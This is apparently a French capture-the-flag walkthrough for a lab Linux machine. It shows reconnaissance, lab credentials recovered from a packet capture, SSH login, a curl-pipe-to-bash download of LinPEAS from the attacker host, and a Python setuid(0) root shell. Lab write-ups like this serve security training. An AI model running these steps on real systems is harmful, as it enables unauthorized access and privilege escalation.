![[Pasted image 20250216154106.png]]

### About machine:
---
- **IP**:
```
 10.10.10.245
```
- **OS**: Linux

### step1: nmap
---

![[Pasted image 20250216155235.png]]

**tentative** de connéxion à **ftp** échoué:
![[Pasted image 20250216155612.png]]
Du coup on passe à **HTTP**. Selon **nmap**, le **port 80** utilse **gunicorn**

- **gunicorn**: Gunicorn (_Green Unicorn_) est un serveur WSGI pour les applications Python, principalement utilisé pour déployer des applications web basées sur des frameworks comme Flask ou Django. Il est conçu pour être performant, compatible avec Unix et basé sur un modèle d'ouvriers (_workers_).

On voit que la capture **wireshark** avec l' **Id=4** n'a rien d'interressant:
![[Screenshot From 2025-02-16 16-22-10.png]]
par contre quand on met **id = 0**, on a
![[Pasted image 20250216174309.png]]on voit un **user = nathan** et un **pass = Buck3tH4TF0RM3!**
- On peut lancer une attaque **ssh**:
```
ssh {user}@{Target IP}
```
une fois connécter: on lance la commande  `ls` puis `cat`

![[Pasted image 20250216175333.png]]
On sait aussi que ce mot de passe fonctionne sur le service **ssh**

### Augmentation des privilèges:
---
##### LinPeas :
excellent outil pour détecter les failles d’élévation de privilèges sur un système Linux
- **Instalation**:

```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh

```
- **Transfert de LinPeas vers la cible** (machine attaquant):
```
sudo python3 -m http.server 8080

```

- **se connecter au serveur créer** (machine cible):

```
curl http://{Ip machine attaquant}/linpeas.sh | bash
```

- Une fois la machine cible connécter:

```
cd /tmp
```

Une fois dans le répertoire /tmp:

```
/usr/bin/python3.8
```

puis:

```
>>> import os
>>> os.setuid(0)
>>> os.system("/bin/bash")
```

- Après ça, on devrait être connécter en tant que **root**, il ne reste plus qu'à taper `ls -la /root` et on devrait trouver le **root-flag**
